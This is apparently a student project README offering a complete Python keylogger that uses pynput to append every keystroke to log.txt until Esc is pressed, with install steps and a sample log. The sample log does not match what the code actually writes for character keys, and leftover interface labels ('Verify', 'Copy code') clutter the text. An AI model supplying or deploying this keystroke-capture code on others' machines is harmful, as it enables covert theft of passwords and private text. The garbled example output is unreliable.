# Prodigy_task4
Simple Keylogger Program
Disclaimer
This project is for educational purposes only. Keyloggers can be used for malicious purposes, and it is essential to consider the ethical implications and obtain necessary permissions before using such a program.

Project Overview
This is a basic keylogger program that records and logs keystrokes. The program focuses on logging the keys pressed and saving them to a file.

Code
keylogger.py
python

Verify

Open In Editor
Edit
Copy code
import pynput
from pynput.keyboard import Key, Listener

def on_press(key):
    """Record key press"""
    with open("log.txt", "a") as f:
        f.write(str(key) + "\n")

def on_release(key):
    """Stop listener when Esc key is pressed"""
    if key == Key.esc:
        # Stop listener
        return False

# Create listener
listener = Listener(on_press=on_press, on_release=on_release)
listener.start()
listener.join()
Requirements
Python 3.x
pynput library (pip install pynput)
Usage
Run the program using python keylogger.py.
The program will start recording keystrokes and saving them to a file named log.txt.
Press the Esc key to stop the listener.
Example Log Output

Verify

Open In Editor
Edit
Copy code
Key.char('a')
Key.char('b')
Key.char('c')
Key.space
Key.char('d')
Key.enter
Note: This is a basic example, and you may want to add additional features, such as filtering out certain keys or adding a timestamp to each log entry
